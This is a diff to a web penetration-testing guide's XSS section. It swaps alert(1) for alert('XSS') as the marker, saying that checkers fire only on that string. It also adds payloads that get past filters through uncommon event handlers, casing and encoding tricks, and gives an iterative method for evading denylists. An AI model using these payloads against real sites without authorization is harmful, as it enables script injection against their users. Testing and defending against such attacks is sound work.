@@ -231,13 +231,13 @@ admin'--
 
 #### XSS Testing
 
-**Reflected XSS payloads:**
+**Reflected XSS payloads** (use `alert('XSS')` or `` alert(`XSS`) `` as the marker — many checkers fire the success signal ONLY on the exact string `XSS`, not on `alert(1)`):
 ```html
-<script>alert(1)</script>
-<img src=x onerror=alert(1)>
-<svg onload=alert(1)>
-'><script>alert(1)</script>
-"><img src=x onerror=alert(1)>
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+'><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
 ```
 
 **DOM XSS payloads:**
@@ -246,19 +246,28 @@ javascript:alert(1)
 #<script>alert(1)</script>
 ```
 
-**Bypass filters:**
+**When a filter blocks a payload — ADAPT, do not conclude "no XSS":**
+Filters typically deny a *specific set of tokens* (commonly `script`, `onerror`, `onload`, `onclick`, `svg`, quotes). If the app rejects a payload with a message that names the blocked token (e.g. "you can't use 'onerror'"), that is a SIGNAL telling you what to avoid — not a dead end. The canonical vectors are the FIRST things any filter blocks; the bypass is almost always a LESS common event handler that the denylist forgot.
+
+Alternative auto-firing event handlers — try these when `onerror`/`onload`/`onclick`/`script`/`svg` are blocked:
 ```html
-<ScRiPt>alert(1)</sCrIpT>
-<img src=x onerror="alert(1)">
-<svg/onload=alert(1)>
+<input autofocus onfocus=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<body onpageshow=alert('XSS')>
+<div onpointerover=alert('XSS')>x</div>
+<style onload=alert('XSS')></style>
+<marquee onstart=alert('XSS')>
+<video><source onerror=alert('XSS')></video>
+<xss onbeforetoggle=alert('XSS')>
 ```
+Also defeat naive token matchers by varying casing (`<ScRiPt>`), HTML-entity-encoding the handler name, or inserting a tab/newline inside the tag.
 
 **Testing approach:**
-1. Submit payload in all input fields
-2. Check if payload appears in HTML response
-3. Test for filter bypasses if sanitized
-4. Check reflected headers (User-Agent, Referer)
-5. Test stored XSS if POST/PUT endpoint
+1. Submit a benign marker first (e.g. `name=MARKER123`) to confirm the reflection point and its context (tag body vs. attribute vs. script)
+2. Try a canonical payload; if it is rejected, READ the response — note exactly which token the filter names as blocked
+3. Adapt: pick a handler/tag from the alternative list above that avoids EVERY blocked token; iterate until a payload reflects unfiltered
+4. Check reflected headers (User-Agent, Referer) and test stored XSS if POST/PUT endpoint
+5. Do NOT conclude "no XSS" until you have (a) identified which tokens the filter strips AND (b) tried at least one payload that avoids all of them and still failed. Having only the canonical `script`/`onerror`/`onload` payloads blocked is NOT sufficient evidence of safety — it is the expected starting point.
 
 **Report if:**
 - Payload executes in response HTML
